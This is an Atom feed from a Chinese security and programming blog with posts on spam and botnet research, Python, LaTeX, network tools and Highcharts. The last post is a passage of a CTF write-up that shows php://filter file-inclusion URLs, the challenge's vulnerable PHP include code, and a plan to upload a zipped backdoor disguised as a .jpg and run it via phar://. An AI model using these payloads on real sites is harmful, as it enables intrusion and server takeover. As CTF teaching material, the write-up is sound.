<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Ourren]]></title>
  <link href="http://blog.ourren.com/blog/atom.xml" rel="self"/>
  <link href="http://blog.ourren.com/blog/"/>
  <updated>2015-05-11T18:17:11-07:00</updated>
  <id>http://blog.ourren.com/blog/</id>
  <author>
    <name><![CDATA[ourren]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[On the Relations Between the Different Actors in the Spam Landscape]]></title>
    <link href="http://blog.ourren.com/blog/2015/05/11/on-the-relations-between-the-different-actors-in-the-spam-landscape/"/>
    <updated>2015-05-11T17:42:36-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/05/11/on-the-relations-between-the-different-actors-in-the-spam-landscape</id>
    <content type="html"><![CDATA[<p>该篇论文的题目为：<a href="http://dl.acm.org/citation.cfm?id=2590302">The Harvester, the Botmaster, and the Spammer- On the Relations Between the Different Actors in the Spam Landscape</a> 通过分析Harvester，Botmaster和Spammer之间的关系。</p>

<p>其实整个过程可以描述为：攻击者从网络上收集邮箱地址，然后利用Botnet发送推广广告或者恶意内容，从而获利。因此论文中对整个过程进行了重现：</p>

<ul>
<li>自己搭建了网络服务并把邮件地址公布在网络上「采用的是自己搭建的邮件服务器」，等待攻击者来采集邮箱，同时记录下其爬虫的标示「HTTP头，IP地址和其它信息」；</li>
<li>记录邮件服务器软件的收信过程，详细记录投递过程，攻击者在发送邮件的时候会暴露一些特征「使用邮件服务器，握手过程」；</li>
<li>对攻击者发送的内容进行分析「主题，域名，发送软件，发件人」；</li>
<li>通过以上数据对这个攻击链进行分析。</li>
</ul>


<!--more-->


<h3>贡献</h3>

<p>通过阅读论文，发现文章主要有如下的贡献点：</p>

<ul>
<li>通过搭建蜜罐系统来分析这个攻击链，可以说工作量相对比较多，思路也不错；</li>
<li>提出了SMTP通信痕迹概念，其实这个概念作者以前的文章就提出了。按照我的理解就是如果使用自定义搭建的SMTP发信的时候通信过程中会多一些步骤，同时可以通过这个过程来标示一个发信机器；</li>
<li>从邮件内容对恶意攻击进行分类，根据内容分为不同的列别；同时通过了Anubis和virustotal来分析IP的历史数据，是否存在恶意行为；</li>
</ul>


<h3>缺点</h3>

<p>但是个人感觉文章存在以下不足：</p>

<ul>
<li>观测时间太短，从2012.12.14-2013.05.15时间跨度太短，做的网站很可能Google都还没有被收录，攻击者就没有办法获取你的邮箱地址；同时可以发现后面的发件人IP居然只有75个，不得不说数据量确实很少；</li>
<li>还是上面的问题，始终感觉这种方式去逼近地下产业，数据量和切入点都太小了。</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On the Arms Race in Spamming Botnet Mitigation]]></title>
    <link href="http://blog.ourren.com/blog/2015/05/08/on-the-arms-race-in-spamming-botnet-mitigation/"/>
    <updated>2015-05-08T14:54:59-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/05/08/on-the-arms-race-in-spamming-botnet-mitigation</id>
    <content type="html"><![CDATA[<p>此文档是G Stringhini的开题报告<a href="http://www0.cs.ucl.ac.uk/staff/G.Stringhini/papers/writeup.pdf">这里下载</a>,针对Botnet的技术进化和科研上对应的防御方案进行了详细地讨论，对于研究botnet的人来说是一份非常不错得入门资料。文档主要分为四个部分:</p>

<ul>
<li>引言简单介绍了Botnet的威胁，来源和发展；</li>
<li>第二部分主要介绍Botnet的进化，包含Botnet的通讯架构和感染两部分；</li>
<li>第三部分主要介绍科研上针对Botnet和垃圾邮件的检测和防御机制；</li>
</ul>


<!--more-->


<h3>引言</h3>

<p>垃圾邮件可以被用来钓鱼，诈骗，但是很多大型电子商务网站都提供推荐/推广功能，攻击者可以通过发送大量这种邮件这种进行获利，然而你这类邮件基本上都是从Botnet机器进行发送，并且调查发现85%的Botnet机器都被用来发送垃圾邮件。针对这种现状研究人员和攻击者一直在这个技术领域进行较量。</p>

<h3>Botnet的进化</h3>

<p>Botnet架构的进化流程如下。</p>

<ul>
<li>IRC Botnet: 最初的Botnet是基于IRC的，受害者通过IRC地址和密码进入特定频道等待管理员发布命令。这种通信方式的弱点：研究人员可以通过恶意文件分析IP地址和密码，然后进入频道分析其行为；另外如果IRC基于域名，研究人员可以通过DNS重定向将所有的受害者机器进行转移；最后IRC协议明文通讯，可以通过协议上对这种行为进行检测；</li>
<li>专有协议Botnet：为了避免已有的协议，攻击者通过自定义加密协议来进行通信；缺点在于研究人员可以对样本进行逆向分析其协议，并可以加入其队列分析行为；另外也存在DNS污染攻击；</li>
<li>多级代理Botnet：通过多次跳转/代理进行隐藏，这种方式还是可以通过黑名单进行block;</li>
<li>域名生成算法Botnet：通过设计一套基于时间的域名生成算法(DGA)，来实现不同时间段的回连地址; 算法部分也可以通过社交网络的标题或者内容进行回连。缺点在于攻击者可以逆向算法并提前注册域名或者攻击社交账号，或者直接block这些域名；</li>
<li>P2P Botnet：针对无公网IP地址的内部受害者，利用一些算法实现P2P通信，缺点在于攻击者可以通过逆向分析其协议和特征，伪装为局域网管理者进行诱骗并分析所有受害主机；</li>
</ul>


<p>Botnet感染方式的进化流程如下：</p>

<ul>
<li>原始感染：通过受感染的机器去扫描更多的存在漏洞的主机并试图感染；</li>
<li>现有感染：（1）通过垃圾邮件发送恶意程序，（2）建立恶意网页，欺骗受害者浏览（drive-by-download attack）；</li>
</ul>


<h3>Botnet的检测研究</h3>

<p>针对Botnet的检测方式很多，概述如下：</p>

<ul>
<li>从主机层面进行检测：通过受害主机检测其样本，并提取特征码加入到杀毒软件特征库；通过分析恶意样本的语义和相似度进行匹配检测；基于动态进行的检测，其中还可以利用提取特征，机器学习进行结合；</li>
<li>从恶意网页进行检测：利用机器学习和页面的特征（重定向，混淆脚本代码）进行静态检测；可以通过虚拟机真实环境浏览网页来动态检测；另外也可以通过不同时间段页面的变化情况进行检测（黑客入侵后会添加恶意代码）；常用攻击代码片段或者内容进行分析判断；</li>
<li>从C&amp;C命令进行检测：通过透明协议，DGA域名进行检测；另外还可以通过搭建蜜罐抓取Botnet的行为进行分析；</li>
<li>从DNS协议进行检测：通过局域网DNS的异常或者不常见规律进行检测；</li>
<li>从SMTP协议进行检测：分析垃圾邮件的原始IP和其它信息来生成黑名单，或者统计这些IP规律；</li>
<li>从社交网络进行检测：攻击者利用社交网络来传播恶意软件，分析攻击者的社交行为给出其IP/域名的安全性；</li>
<li>从网络层面进行检测：恶意数据包，C&amp;C特定协议或者攻击包；</li>
</ul>


<h3>总结</h3>

<p>文章从Botnet的发展到进化，并针对不同的技术点总结了前人对该点的检测技术，整体而言，内容十分比较丰富，特别是参考文献。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python中域名处理技巧]]></title>
    <link href="http://blog.ourren.com/blog/2015/04/26/python-with-domain/"/>
    <updated>2015-04-26T12:05:01-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/04/26/python-with-domain</id>
    <content type="html"><![CDATA[<p>Python中经常会遇到各种字符串处理问题，而在网络请求这块又经常与URL或者域名打交道，本文侧重介绍Python在处理URL/或者域名中的技巧，涉及到的Python主要有如下几种：</p>

<ul>
<li>urlparse</li>
<li>tldextract</li>
<li>dnspython</li>
</ul>


<!--more-->


<h3>域名解析</h3>

<p>主从给定的URL提取其主机「即请求域名」，协议，路径，甚至参数。 例如从<a href="http://blog.ourren.com/2015/04/14/ip-information-with-python">http://blog.ourren.com/2015/04/14/ip-information-with-python</a> 获取“blog.ourren.com”, “http&#8221;, &ldquo;/2015/04/14/ip-information-with-python/&#8221;。</p>

<p>此类问题一般采用urlparse来进行处理，针对处理后的数据进行拼接即可获得，示例代码如下：</p>

<pre><code>from urlparse import urlparse
print urlparse('http://blog.ourren.com/2015/04/14/ip-information-with-python/')
ParseResult(scheme='http', netloc='blog.ourren.com', path='/2015/04/14/ip-information-with-python/', params='', query='', fragment='')
</code></pre>

<h3>主域名</h3>

<p>主要是指获取域名的主域名「即需要去除子域名」和域名后缀，例如从<a href="http://blog.ourren.com/2015/04/14/ip-information-with-python">http://blog.ourren.com/2015/04/14/ip-information-with-python</a> 获取“ourren.com”，“com”；</p>

<p>这类问题可以通过tldextract进行处理，而tldextract则是对tld库进行了封装，使用起来比较方便，示例代码如下：</p>

<pre><code>import tldextract
tldextract.extract("http://blog.ourren.com/2015/04/14/ip-information-with-python/")

ExtractResult(subdomain='blog', domain='ourren', suffix='com')
</code></pre>

<h3>子域名</h3>

<p>其实获取特定域名的子域名的思路主要有几种：基于字典的暴力解析；基于搜索引擎结果的去重分析；基于域传送漏洞；基于全球网站数据的筛选；并且也有很多开源的工具可以参考，<a href="https://www.sec-wiki.com/topic/3">SecWiki-二级域名搜索工具汇总</a> 就对这些工具进行了汇总，所以这里就不具体讨论了。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LaTeX写作技巧总结]]></title>
    <link href="http://blog.ourren.com/blog/2015/04/17/latex-skils-summary/"/>
    <updated>2015-04-17T21:28:38-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/04/17/latex-skils-summary</id>
    <content type="html"><![CDATA[<p>最近开始利用LaTeX写作复杂的文档，心情那个叫个爽呀，一点感觉不到排版的烦恼了。什么Word分页与分节？什么页眉与页脚？统统没有这种烦恼。这种写作乐趣就是让你只关注写作内容，爽歪歪地写下去，其实跟Markdown写博客，Git管理代码差不多的心情。其实这种烦恼只是转移到制作模板的人身上了，但是LaTeX实在是提供了太多的模板，so,尽管写吧。</p>

<p>写作环境推荐：</p>

<ul>
<li><a href="http://texstudio.sourceforge.net/">TeXstudio</a> 免费软件做得非常好用，并且跨平台，更新及时，实时编译为PDF，英文单词自动纠正，其它特性就不说了，就这几个特性就可以秒杀很多同类软件；</li>
<li><a href="http://www.tablesgenerator.com/latex_tables">tablesgenerator</a> 在线LaTex表格生成工具，谁用谁知道；</li>
<li><a href="http://www.codecogs.com/latex/eqneditor.php">latex eqneditor</a> 在线LaTex公式生成工具；</li>
<li>Excel 这个大家都懂的吧，画图好使；</li>
</ul>


<!--more-->


<p>下面给一些常用的LaTex实例代码：</p>

<h4>插入图片</h4>

<p>需要在顶部引入如下包，其中graphicspath中是设置图片的存放根目录，一般常常新建一个目录来存放图片。</p>

<pre><code>\usepackage{graphicx}
\usepackage{graphicx}
\graphicspath{ {img/} }
</code></pre>

<p>在插入图片的时候使用如下代码，其中：</p>

<pre><code>\begin{figure}[!htb]
    \centering
    \includegraphics[width=0.5\textwidth]{picture_name}
    \caption{describe of this image\label{fig:image}}
\end{figure}
</code></pre>

<ul>
<li>width 表示这个图片占的宽度；</li>
<li>picture_name 表示文件名；</li>
<li>lable 正文中引用使用，格式s~\ref{fig:image}；</li>
</ul>


<h4>插入表格</h4>

<p>表格直接使用在线工具生成，一般也会新建一个文件夹例如table来存放表格，每个表格单独保存为xxx.tex文件，然后使用如下代码引入表格：</p>

<pre><code>\input{tables/xx.tex}
</code></pre>

<h4>双栏并排</h4>

<p>这里的双栏并排主要是指表格或者图片双栏显示，比如需要讲两个图显示在一行，可以先引入如下包，然后使用下面的代码就可以将两个表格并排。其实还是通过textwidth的属性值来控制宽度的。</p>

<pre><code>\usepackage{graphicx}
\usepackage{subfigure}

\makeatletter\def\@captype{figure}\makeatother
\begin{table*}
    \begin{minipage}{0.50\textwidth}
        \centering
        \input{tables/a.tex}
        \caption{describe a table}
        \label{table:a}
    \end{minipage}
    \makeatletter\def\@captype{table}\makeatother
    \begin{minipage}{0.50\textwidth}
        \centering
        \input{tables/b.tex}
        \caption{describe b table}
        \label{table:b}
    \end{minipage}
\end{table*}
</code></pre>

<h4>插入算法</h4>

<p>插入伪代码的生活需要先包含如下包：</p>

<pre><code>\usepackage{algorithm}
\usepackage{algpseudocode}
\usepackage{amsmath}
\usepackage{graphics}
\usepackage{epsfig}
\renewcommand{\algorithmicrequire}{\textbf{Input:}}  % Use Input in the format of Algorithm
\renewcommand{\algorithmicensure}{\textbf{Output:}} % Use Output in the format of Algorithm
</code></pre>

<p>伪代码的具体写法如下, 更多详细的语法可以参照这里 <a href="http://www.ctex.org/documents/packages/verbatim/algorithms.pdf">LaTex algorithms</a>:</p>

<pre><code>\begin{algorithm}[!htb]
\caption{describe algorithm.}
\label{alg:new}
\begin{algorithmic}[1]
    \Require
    input, $D$;
    input varible;
    \Ensure
    \For{each virable in D$}
    \EndFor
    \State xxxx
    \EndFor
    \label{code:recentEnd}
\end{algorithmic}
\end{algorithm}
</code></pre>

<h4>列表描述</h4>

<p>在有些时候需要列出个1，2，3的列表，具体格式就很简单了，主要有itemize和enumerate两种，前者是列表前面是符号，而后者就是(1),(2)这种。</p>

<pre><code>\begin{itemize}
    \item one
    \item two
    \item three 
\end{itemize}

\begin{enumerate}
    \item one
    \item two
    \item three 
\end{enumerate}
</code></pre>

<h4>参考文献</h4>

<p>一般是新建一个biblio.bib来专门存放参考文件，然后利用如下代码引入：</p>

<pre><code>\bibliographystyle{IEEEtran}
\bibliography{biblio}
</code></pre>

<p>同时一个项目的文献这些可以使用 <a href="https://www.zotero.org/">zoteo</a> 或者 <a href="https://www.mendeley.com/">mendeley</a>来管理并导出。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用公开接口获取IP信息]]></title>
    <link href="http://blog.ourren.com/blog/2015/04/14/ip-information-with-python/"/>
    <updated>2015-04-14T11:20:48-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/04/14/ip-information-with-python</id>
    <content type="html"><![CDATA[<p>其实关于IP信息的讨论和文章非常多，但是选择适合一种简洁并且有效的方法无疑是最佳的。同时查询IP信息主要由两种方式：在线查询/接口，本地IP数据库。 现将目前这方面的资源总结如下：</p>

<h4>在线平台/接口</h4>

<p>虽然目前能够提供IP信息查询的平台很多，但是国内最著名的可能还是<a href="http://ip138.com/">ip138</a>，但是IP138目前能够提供的IP信息确实太少了，不管是做渗透还是做项目相信大家都不会采用这个查询，目前做得不错的主要有如下接口，鉴于IP信息存在国外和国内的差别，因此还是简单做下分类：</p>

<!--more-->


<p>国内IP信息查询平台：</p>

<ul>
<li><a href="http://www.ipip.net/">IPIP</a></li>
<li><a href="http://ip.qq.com/">腾讯IP</a></li>
<li><a href="http://ip.taobao.com/">淘宝IP</a></li>
<li><a href="http://ip138.com/">IP138</a></li>
</ul>


<p>国外IP信息查询平台：</p>

<ul>
<li><a href="http://ip-api.com/">ip-api</a></li>
<li><a href="https://db-ip.com/">db-ip</a></li>
<li><a href="http://bgp.he.net/">BGP</a></li>
<li><a href="http://www.ip2location.com/demo">ip2location</a></li>
</ul>


<p>国内的查询相对比较简洁，而国外的在线平台给出的数据相对比较多，但是db-ip和ip2location每天都有限制查询，而ip-api则直接提供了API的查询接口，并且没有限制查询数量。</p>

<h4>本地IP数据库</h4>

<p>如果所做系统不能联网或者由于其它原因需要离线IP信息查询，国内和国外都有很著名的离线IP数据库,在项目需求不高时可以使用，现统计如下：</p>

<ul>
<li>国内的<a href="http://www.cz88.net/">IP纯真数据库</a>；</li>
<li>国外的<a href="http://dev.maxmind.com/zh-hans/geoip/legacy/geolite/">MaxMind Geo数据库</a>；</li>
<li>国内最近的<a href="http://www.ipip.net/download.html">ipip</a></li>
</ul>


<h4>Python查询接口</h4>

<p>Python写接口查询就相对比较容易了，但是鉴于很多接口都请求次数限制，因此需要考虑的问题还是比较多，总结如下：</p>

<ul>
<li>Python下使用requests进行https请求时，可能会遇到证书问题，当设置“verify=False”时会出现警告信息，可以通过导入warning库进行处理，具体见<a href="https://github.com/kennethreitz/requests/issues/2214">这里</a>;</li>
<li>如果是采用网页进行请求匹配，最好直接用字符串查找替换（replace,split）就OK，正则会有一些问题；</li>
<li>如果HTTP请求可以通过添加代理来绕过查询次数限制；</li>
</ul>


<p>写了三个平台(ip-api, db-ip, ip2location)的查询接口，大家可以拿去直接用, 推荐ip-api这个接口。</p>

<p>项目地址：<a href="https://github.com/ourren/ip-api">ip-api</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用MTR分析网络状况]]></title>
    <link href="http://blog.ourren.com/blog/2015/03/27/diagnosing-network-issue-with-mtr/"/>
    <updated>2015-03-27T12:00:33-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/03/27/diagnosing-network-issue-with-mtr</id>
    <content type="html"><![CDATA[<p>平时测试网络状况一般都使用「ping, tracert, nslookup」这几个命令，但是<a href="https://github.com/traviscross/mtr">Mtr</a>(My traceroute)是一是一个非常棒的网络连通性判断工具，它结合了ping, traceroute,nslookup 的相关特性。当网络链路出现问题时很多人会用ping命令，可以简单的测试网络的连通性，看下丢包率，但是却无法确定是在哪里出现了问题；有些人就会用tracert命令来查看路由，或者用nslookup命令来查看DNS是否可用；如果你也觉得这三个命令太麻烦的话，那就用mtr吧，并且显示界面很美「没觉得么？」<!--more --></p>

<pre><code>                           My traceroute  [v0.71]
ts3-142.ts.cn.tlan (0.0.0.0)                           Fri Aug  3 22:39:50 2007
Keys:  Help   Display mode   Restart statistics   Order of fields   quit
                                              Packets               Pings
 Host                                       Loss%  Last   Avg  Best  Wrst StDev
 1. 172.16.76.1                              0.0%   0.5   0.4   0.4   0.5   0.1
 2. 202.108.132.17                           0.0% 179.0  20.2   2.3 179.0  55.8
 3. 172.19.140.69                            0.0%  13.7  10.3   6.2  17.1   3.8
 4. 172.17.0.17                              0.0%   9.3  16.5   8.6  62.3  16.3
 5. 172.16.0.57                              0.0%   9.9  11.2   6.1  21.0   5.4
 6. 192.168.0.25                             0.0%   7.3  11.4   5.1  17.2   4.2
 7. 210.74.176.241                          10.0% 110.1 109.6  92.7 123.3  11.3
 8. 202.96.13.101                           20.0% 104.9 111.8 101.4 126.5   9.3
 9. 202.106.192.233                         30.0% 120.7 113.8  85.5 138.8  17.2
10. 61.148.143.26                           10.0%  99.7 112.0  99.7 120.9   6.9
11. 202.96.8.246                            20.0%  97.0 108.2  92.3 137.4  14.3
12. 210.77.38.126                           11.1% 133.0 113.8  97.0 133.0  11.8
13. 
</code></pre>

<h4>安装步骤</h4>

<p>Mac下直接用brew进行安装「虽然经常吐槽brew各种不如linux下的包管理软件，但是有时候还是不错」：</p>

<pre><code>brew install mtr
sudo /usr/local/Cellar/mtr/0.86/sbin/mtr 8.8.8.8
ln -s /usr/local/Cellar/mtr/0.86/sbin/mtr /usr/bin
sudo mtr 8.8.4.4
</code></pre>

<p>Linux貌似就更简单：</p>

<pre><code>yum -y install mtr
apt-get install mtr-tiny
</code></pre>

<p>Windows只能用这<a href="http://sourceforge.net/projects/winmtr/">WinMTR</a>替代下。</p>

<h4>相关命令</h4>

<p>查看help:</p>

<pre><code>root@ts3-142 ~]# mtr --help
usage: mtr [-hvrctglspni46] [--help] [--version] [--report]
                [--report-cycles=COUNT] [--curses] [--gtk]
                [--raw] [--split] [--no-dns] [--address interface]
                [--psize=bytes/-s bytes]
                [--interval=SECONDS] HOSTNAME [PACKETSIZE]

各主要参数解释如下：
--report                       追踪结果以报告模式输出
--report-cycles=COUNT          定义追踪的次数，默认为16
--raw                          使结果以原始格式输出
--split                        将每次追踪的结果分别列出来，不象--report一样，统计整个结果
--no-dns                       只显示ip地址，不解析ip地址对应的主机名
--psize=bytes/-s bytes         定义数据包的大小，单位是字节
</code></pre>

<p>日常一般这样子用就可以得到前面的报告结果了。</p>

<pre><code>mtr --report -c 10 -n www.turbolinux.com.cn
//或者
 mtr --report www.google.com
 mtr --no-dns --report google.com
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Highcharts使用入门与技巧]]></title>
    <link href="http://blog.ourren.com/blog/2015/03/23/highchart-note-with-php/"/>
    <updated>2015-03-23T00:00:00-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/03/23/highchart-note-with-php</id>
    <content type="html"><![CDATA[<p><a href="http://www.highcharts.com/">Highcharts</a>作为最牛逼的前端图形库当之不愧，不仅使用简单并且非盈利项目可以免费使用，复制粘贴几下就可以生成绚丽的图表，方便各位给Leader或者外行人员装逼专用。虽然说目前百度的<a href="http://echarts.baidu.com">Echarts</a>也非常火爆，荣获github上国内加星最多的项目，但是个人始终觉得还是Highcharts更胜一筹，不过在大数据特征展示上面我还是推荐Echarts。</p>

<p>个人接触Highcharts已经有好几年了，但是从来都没怎么深入研究过，不过话又说回来，Highcharts这种傻瓜式的前端库也没有高深的使用技巧，但是对于不熟悉的新手可以从如下的总结中进步提升。</p>

<!--more-->


<h3>初级配置</h3>

<p>初级配置就是把Highcharts给跑起来，复制几段代码就ok：</p>

<ul>
<li>HTML页面中包含<a href="http://www.highcharts.com/lib/jquery-1.7.2.js">jquery.js</a>, <a href="http://code.highcharts.com/highcharts.js">highcharts.js</a>, <a href="http://code.highcharts.com/modules/exporting.js">exporting.js</a>；</li>
<li>打开<a href="http://www.highcharts.com/demo/">highcharts demo</a>中的任意样式，然后选择「view options」就可以看到此demo的实现代码，复制到你的HTML页面中；</li>
<li>在HTML页面中新建一个div层，id为「container」；</li>
<li>刷新浏览器看效果。</li>
</ul>


<p>以上就是初级配置的详细过程；</p>

<h3>主题修改</h3>

<p>在demo页面中其实有很多的主题样式「dark, gray, sand等」，使用的时候也很简单:</p>

<ul>
<li>下载<a href="https://github.com/highslide-software/highcharts.com/tree/master/js/themes">主题文件</a>中对应颜色的js文件到你本地;</li>
<li>在你的HTML页面中包含对应的JS文件；</li>
<li>完工</li>
</ul>


<h3>线条修改</h3>

<p>颜色修改</p>

<p>在具体的项目中，当你需要修改线条的颜色时，你可以通过在demo 实例代码中添加如下代码：</p>

<pre><code>series: [{
        name: 'Tokyo',
        data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6],
        color: 'blue'
    }]
</code></pre>

<p>即在数据的下面添加了color属性，color的值可以取颜色对应的英文名字，例如「red, purple, green」等;</p>

<p>线条形状</p>

<p>可能你需要在一幅图形中显示相同颜色的两条曲线，这样你可以通过显示虚线或者实线来实现，显示代码如下：</p>

<pre><code>series: [{
        name: 'Tokyo',
        data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6],
        dashStyle: 'dash',
        color: 'blue'
    }]
</code></pre>

<p>添加dashStyle属性即可修改线条的形状</p>

<h3>PHP代码结合</h3>

<p>很多时候，highcharts需要的数据其实是由后端脚本生成的，比如PHP，这里可以通过PHP的json_encode实现快速赋值,当然输入是一个数组；</p>

<pre><code>series: [{
        name: 'original',
        data: &lt;?php echo json_encode(getData('PV'));?&gt;,
        dashStyle: 'dash',
        color: 'orange',
    }]
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Phar突破文件包含]]></title>
    <link href="http://blog.ourren.com/blog/2015/03/16/phar_include_exploit/"/>
    <updated>2015-03-16T00:00:00-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/03/16/phar_include_exploit</id>
    <content type="html"><![CDATA[<p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>

<pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
</code></pre>

<p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：<!--more--></p>

<pre><code>cat 1.php | rot13
</code></pre>

<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>

<pre><code>&lt;?php
$p = $_REQUEST['page'];

if($p == "" || $p == "index")
{
$p = "main";
}

$haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgICAgICAgLyAvIC8qKioqKipcCiAgICAgICAgICAgICAgICAgLyAvKioqKi0tICogKlwKICAgICAgLy8oKCg6PDw8PC86KioqKioqKioqM1xYKlwoKDwKICAgICAvWFgvQ1hDJkNHRy8vKiovLS0vLy9YKlZcKiouLmcmCigvVkNDM2dnMC4uLi4uLi4uKi8vWC8vKC8vL1YqQ1wqLi44ODhnZzhnJjNDPAooMyZnRyYuLi4uLi4uLi4uLiouLlhYWC8oKCgvKi5cKi4uLi4uLi5HLzA4ODgzWDxgCi8oPEM4IC4uLi4uLi4uLi4uKi5YWFhYLy8vLzwvLi4qLi4uLi4uLi4uLi4uLi4uM0NeClgvLzw8Ly4uLi4uLi4uLi4uKiZDVlgvLy9WLzw8Ly4qLi4uLi4uLi4uLi4uLi4uOEdDPApYWC9DLzo8L1YuLi4uLi4uLiomM0NWWFZYVlgoPFYqKi4uLi4uLi4uLi4uLi4uLiBnOENeCiAgICBHQy88PC8oLi4uLi44RyYzQ0NWWFhYWFZ+WFYqLi4uLi4uLi4uLi4uLi4uIEM4M1YKICAgICAgIFYvPF48KFg4OCZWLy8oKDw8PDwoKDxePCoqLi4uLi4uLi4uLi4uLi4uWCYmQwogICAgICAgICAgICAgIGA6L0NDVi8oKCg8PCgvVlZWLyouLi4uLi4uLi4uLi4uLigvQyYvCiAgICAgICAgICAgICAgIDw8IF5eKC9WMzNWWC9WQyZYKlZDLi4uLjo8PH48PDwoKFggIGAKICAgICAgICAgICAgICAgVi8oLzwgXiBeXjovWC8oKDw8Xl4tLS1WOn5+PDwoCiAgICAgICAgICAgICAgMyYgICAgICAgICAgICAgICAgICAuXi0vCiAgICAgICAgICAgICAgQyAgL1wgICAgICAgL1wgICAgICAgIHwKICAgICAgICAgICAgIC9DICBcLyAgICAgICBcLyAgICAgICAvLwogUExaIFNUT1AgICAgIDMgICAgICAgICAgICAgICAgICAgIHxcCiAgIEhBQ0tJTkcgICAgQyAgICAgICAgICAgICAgICAgICAvNSoKICAgICAgICAgICAgICBWICAgICAvLS0tLS1cICAgICAgIC8KICAgICAgICAgICAgICBDRyAgfCAgICAgICAgIHwgIDwvLy88CiAgICAgICAgICAgICAgVkdWIHwgICAgICAgICB8IF4oL1g8XgogICAgICAgICAgICAgICAmJjwgIFwtLS0tLS8gIC4oKDwoXgogICAgICAgICAgICAgICAgODMoICAgICAgICAuPCh+YDw8CiAgICAgICAgICAgICAgICAgOFhgICAgICAuPDxeYCBgKCheCiAgICAgICAgICAgICAgICBCQEBDPC5gXl5gICAgICBeKENHJkMoPC5gYAogICAgIENHOEIkQEBAQEBAQEBAJCggICAgICAgICAgXl4oMEBAQEAkODNYPGAKICAgQkBAQEBAQEBAQEBAQEBAQEBAOC8gICAgICAgYDxDJEBAQEBAQEBAQEAkJjwKICBAQEBAQEBAQEBAQEBAQEAkJCRAQEAkJDA4ODhCQEBAQEBAQEBAQEBAQEBAQEBWYAogQEBAQEBAQEBAQEBAQEAkQCQkJCQkJCRAQEBAJCRAQEAkQEBAQEBAQEBAQEBAQEBDYApAQEBAQEBAQEBAQEBAQCRAJCQkJCQkJCQkJCQkJCQkJCQkQEBAQEBAQEBAQEBAQEBAKGAKQEBAQEBAQEBAQEAkQCQkJCQkJCQkJCQkJCQkQEAkJEBAQEBAQEBAQEBAQEBAQEBAQEIK");
$haq = htmlentities($haq);

if(strstr($p,"..") !== FALSE)
die("&lt;pre&gt;$haq&lt;/pre&gt;");

if(stristr($p,"http") !== FALSE)
die("&lt;pre&gt;$haq&lt;/pre&gt;");

if(stristr($p,"ftp") !== FALSE)
die("&lt;pre&gt;$haq&lt;/pre&gt;");

if(strlen($p) &gt;= 60)
die("&lt;pre&gt;string &gt; 60
$haq&lt;/pre&gt;");

$inc = sprintf("%s.php",$p);

?&gt;
&lt;?php
include($inc);
?&gt;
</code></pre>

<p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>

<p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>

<pre><code>xxxx.jpg ----&gt;randon.jpg
</code></pre>

<p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>

<ul>
<li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
<li>不存在截断，因为php版本为：5.5.x；</li>
<li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
</ul>


<p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>

<ul>
<li>file:// — Accessing local filesystem</li>
<li><a href="http://">http://</a> — Accessing HTTP(s) URLs</li>
<li><a href="ftp://">ftp://</a> — Accessing FTP(s) URLs</li>
<li>php:// — Accessing various I/O streams</li>
<li>zlib:// — Compression Streams</li>
<li>data:// — Data (RFC 2397)</li>
<li>glob:// — Find pathnames matching pattern</li>
<li>phar:// — PHP Archive</li>
<li>ssh2:// — Secure Shell 2</li>
<li>rar:// — RAR</li>
<li>ogg:// — Audio streams</li>
<li>expect:// — Process Interaction Streams</li>
</ul>


<p>排除上面的测试结果只能测试其它的，于是开始测试file://（无效），SMB(本地可行，本地环境不行)，ssh2://(不行)，当时测试了很多环境没搞定，暂时就没搞了。「在这里备注下：发现digitalocean开一个临时的VPS来玩比赛挺好的，随时开关也不怎么费钱，还公网IP」；</p>

<p>后来内部有人提测试下phar://，好吧，厚着脸皮再玩下，其实原来在开发yii2的时候有使用composer这个工具，貌似也是phar的后缀，没怎么注意，一查吓一跳，结果phar是php5.3以后引入的，其实就是一个zip打包的文件，这。。。</p>

<p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>

